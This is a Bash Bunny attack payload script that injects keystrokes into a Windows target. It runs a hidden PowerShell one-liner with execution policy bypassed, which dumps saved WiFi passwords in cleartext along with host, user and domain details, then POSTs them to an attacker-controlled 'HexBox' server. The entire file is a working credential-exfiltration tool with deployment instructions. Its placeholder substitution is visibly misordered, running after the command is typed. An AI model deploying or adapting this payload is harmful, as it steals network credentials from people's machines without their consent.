#!/bin/bash
# bunny_exfil.sh — Bash Bunny Switch 2: HID credential exfil from Windows target
# Deploy: copy to /root/udisk/payloads/switch2/payload.sh on the Bash Bunny
#
# Attack flow: HID + ECM_ETHERNET → open PowerShell → dump WiFi creds + sysinfo → POST to HexBox

HEXBOX="10.0.0.99"
HEXBOX_PORT="8000"

ATTACKMODE HID ECM_ETHERNET
LED R B FAST
sleep 3

# Open Run dialog
Q GUI r
Q DELAY 500

# One-liner: collect WiFi passwords + sysinfo, base64-encode, POST to HexBox
Q STRING powershell -w h -nop -ep bypass -c "$o=@{host=$env:COMPUTERNAME;user=$env:USERNAME;domain=$env:USERDOMAIN;os=(Get-WmiObject Win32_OperatingSystem).Caption;wifi=@((netsh wlan show profiles)|Select-String 'Profile\s*:\s*(.+)'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear|Out-String);@{ssid=$n;key=($p|Select-String 'Key Content\s*:\s*(.+)'|%{$_.Matches.Groups[1].Value.Trim()})}})};$j=$o|ConvertTo-Json -Depth 5 -Compress;$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($j));iwr 'http://HEXBOX_IP:HEXBOX_PORT/sysinfo' -Method POST -Body ('host='+$env:COMPUTERNAME+'&data='+[Uri]::EscapeDataString($b)) -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing|Out-Null
Q ENTER

# Replace placeholders at runtime
sed -i "s/HEXBOX_IP/$HEXBOX/g; s/HEXBOX_PORT/$HEXBOX_PORT/g" "$0" 2>/dev/null || true

sleep 8
LED G SOLID
